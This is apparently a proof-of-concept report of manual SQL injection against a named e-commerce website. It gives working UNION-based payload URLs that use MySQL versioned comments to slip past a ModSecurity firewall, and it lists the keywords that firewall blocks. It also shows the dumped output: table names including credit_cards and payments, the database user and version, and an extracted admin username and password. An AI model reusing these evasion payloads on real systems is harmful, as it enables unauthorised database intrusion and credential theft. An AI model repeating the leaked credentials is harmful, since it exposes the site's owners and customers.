NAME: IMOLEAYO BABATUNDE - PoC
DATE : 22ND JULY, 2024.
Manual Testing on CIPHER((E97.CRE.QID.0E8)
--------------------------------------------------------------
SITE RECON RESTRICTED TO THE DATABASE TESTING
DBMS: MySQL
Version: 5.7.23-23
IPS/IDS/WAF: ModSecurity (SpiderLabs(TrustWave))
Server Technologies: PHP
SQL Injections Types: Error_Based, Union_Attacks, Boolean-Types.
Input Field: /pages.php?id=1
Field Type: Integer
Error Injection/payload/Value: {/pages.php?id=1'-- -}  || Database Query Failed; you have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near ''LIMIT 1'.

Comment on String Delimiter: With no string delimiter, there is no ERROR.
DATABASE ACCEPTABLE CHARACTERS: '--' as comments, whitespaces, pipes(||) not enabled for string joining or concatenation. '/* */' for inline and multilines comments.

-------------------------------------------------------------- 
Payloads To Reveal The Inject The Possibility of Crafted Of Complex Payloads:

"---/pages.php?id=1+OR+1=1--+-
"---/pages.php?id=1+OR+'a'='a'--+-
"---/pages.php?id=1+UNION+SELECT+NULL--+-
 These payloads result into a common ERROR "Not Acceptable!
An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security."

This reveals a potential of SQL Injections Intrusion Detection and Intrusion Prevention System IDS/IPS or Web Application Firewall(WAF).

Further testing through some common SQL keywords reveals that the WAF has been configure to search for and filter these words out to stop the whole request from reaching the server; s
search for and filters for the following keywords noted:
NOTE: Some searched filters  require that the WAF should look for the existence of some keywords appearing together.
Examples:
OR and SELECT
UNION and SELECT
CONCAT()
OR 1=1
OR 'a'='a'
NULL and NULL
%001

Further Into the Payloads dumped into the Applications:
The following keywords were search for and blocked;
TABLE
COLUMN
SCHEMA_NAME
SCHEMA
I believe will not be exhaustive if  it has been probed further, less concerned, need to get the sensitive and all information extracted. 
:)
 
 THE OBSCUSCATION AND THE POSSIBLE EVASION TECHNIQUES-:
 
 ON the payload "---/pages.php?id=123+OR+1=1--+-"
Obscured with "---/pages.php?id=123+OR+1909=1909"
 
 ORDER BY revealed that the required COLUMNS is 14
 
 UNION ATTACKS: 
 Evaded search for on UNION and SELECT keywords using this techniques
 In-bound-comment SQL commands, and the interpretation of the code to if the version is 5.0.0-0 or greater
 
 UNION --> /*!50000UNION*/ 
 SELECT --> /*!50000SELECT*/
 and this made it possible to inject the SQL keywords without being searched for by the WAF.
 This also reveal the columns field type is string. With the vulnerable columns 
 observed to be columns 5 and 10.
--------------------------------------------------------------
--------------------------------------------------------------
DATABASES DUMPED - PAYLOAD - EXTRACTED DATA
List Tables In The Database 'gbmltf'

payload:
https://gbmltf.co/pages.php?id=-3+/*!50000union*/+/*!50000select*/+%271%27,null,%273%27,%274%27,5,%276%27,%277%27,%278%27,%279%27,+group_concat(/*!50000table_name*/),%2711%27,%2712%27,%2713%27,%2714%27+/*!50000from*/++/*!50000information_schema.tables*/+/*!50000where*/+table_schema=%27gbmltf_dbs%27+--+-
data : {add_banners,addresses,banners,basket,basket_size,blog_categories,blog_comment,blog_post,categories,certificates,colors,credit_cards,customer,delievery_time,drafts,gallery,logo,mediaportfolio,menu,news,orders,package_deatail,pages,partners,payments,pport,product_more,products,products_size,site,sizes,social,suppliy_ability,testimonials,userfiles,users,xpages,zones}

Get Current_User And Database And Version 

payload : 
	https://gbmltf.co/pages.php?id=-3+/*!50000union*/+/*!50000select*/+%271%27,null,%273%27,%274%27,DATABASE(),%276%27,%277%27,%278%27,%279%27,version(),%2711%27,%2712%27,%2713%27,%2714%27+--+-
---------------------------------------------
AND
----------------------------
https://gbmltf.co/pages.php?id=-3+/*!50000union*/+/*!50000select*/+%271%27,null,%273%27,%274%27,database(),%276%27,%277%27,%278%27,%279%27,USER(),%2711%27,%2712%27,%2713%27,%2714%27+--+-
 
 DATA : {
gbmltf_dbs
gbmltf_webuser@localhost
5.7.23-23
 }
 
 Get The Schema And List All The Databases 
 
 payload :
 https://gbmltf.co/pages.php?id=-3+/*!50000union*/+/*!50000select*/+%271%27,null,%273%27,%274%27,5,%276%27,%277%27,%278%27,%279%27,+group_concat(schema_name),%2711%27,%2712%27,%2713%27,%2714%27+/*!50000from*/++information_schema.schemata+--+-
 
 DATA : {
 information_schema, gbmltf_dbs
 }
 
 PICK USERS TABLE 
 List All The Columns In The Users Table
 
 payload : 
https://gbmltf.co/pages.php?id=-3+/*!50000union*/+/*!50000select*/+%271%27,null,%273%27,%274%27,5,%276%27,%277%27,%278%27,%279%27,+group_concat(/*!50000column_name*/),%2711%27,%2712%27,%2713%27,%2714%27+/*!50000from*/++/*!50000information_schema.columns*/+/*!50000where*/+table_name=%27users%27+--+- 
 data : {
 id,username,password
 }
 
 Extract All Usernames And Passwords From The Users Table
 
 payload : 
 https://gbmltf.co/pages.php?id=-3+/*!50000union*/+/*!50000select*/+%271%27,null,%273%27,%274%27,5,%276%27,%277%27,%278%27,%279%27,+group_concat(username,password),%2711%27,%2712%27,%2713%27,%2714%27+/*!50000from*/++users+--+-#
 
 data : {
 adminAdmin123
 }
